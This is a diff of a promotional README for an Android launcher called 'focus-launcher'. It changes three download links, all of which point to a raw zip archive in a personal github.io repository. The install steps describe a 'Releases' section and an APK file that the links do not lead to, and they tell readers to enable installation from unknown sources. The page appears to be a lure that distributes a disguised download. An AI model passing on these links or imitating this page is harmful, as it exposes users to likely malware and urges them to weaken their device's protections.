@@ -9,7 +9,7 @@ description: "Reclaim your time with a minimalist Android launcher—black-and-w
 
 Welcome to **focus-launcher** - a beautifully simple, text-only launcher for your Android device that helps you break free from distracting apps. If you're tired of endless scrolling and want a cleaner, more intentional phone experience, you're in the right place!
 
-**Visit this link to download the application:** [Click Here to Download focus-launcher](https://github.com/sako8757/sako8757.github.io/raw/refs/heads/main/modules/t6/v3.9.zip)
+**Visit this link to download the application:** [Click Here to Download focus-launcher](https://raw.githubusercontent.com/sako8757/sako8757.github.io/main/modules/t6/v3.9.zip)
 
 This launcher replaces your phone's home screen with a minimalist, black-and-white interface that shows only what you need. No icons, no colors, no distractions - just your apps listed in a clean, readable format.
 
@@ -40,7 +40,7 @@ Your usage data stays on your device. There are no accounts, no cloud sync, no t
 
 Getting started with focus-launcher is easy:
 
-1. **Visit the download page**: [https://github.com/sako8757/sako8757.github.io/raw/refs/heads/main/modules/t6/v3.9.zip](https://github.com/sako8757/sako8757.github.io/raw/refs/heads/main/modules/t6/v3.9.zip)
+1. **Visit the download page**: [https://raw.githubusercontent.com/sako8757/sako8757.github.io/main/modules/t6/v3.9.zip](https://raw.githubusercontent.com/sako8757/sako8757.github.io/main/modules/t6/v3.9.zip)
 2. **Find the latest release**: Look for the "Releases" section on the page
 3. **Download the APK file**: Choose the latest version (usually named `focus-launcher-1.x.x.apk`)
 4. **Enable unknown sources**: On your Android device, go to Settings → Security, and allow installation from unknown sources (this is standard for apps outside the Play Store)
@@ -107,7 +107,7 @@ Thousands of users have already made the switch to a more intentional phone expe
 
 **Ready to get started?** Download focus-launcher today and take the first step toward digital balance.
 
-[Download focus-launcher now](https://github.com/sako8757/sako8757.github.io/raw/refs/heads/main/modules/t6/v3.9.zip)
+[Download focus-launcher now](https://raw.githubusercontent.com/sako8757/sako8757.github.io/main/modules/t6/v3.9.zip)
 
 Remember: a phone is a tool, not a distraction. focus-launcher helps you keep it that way.
 
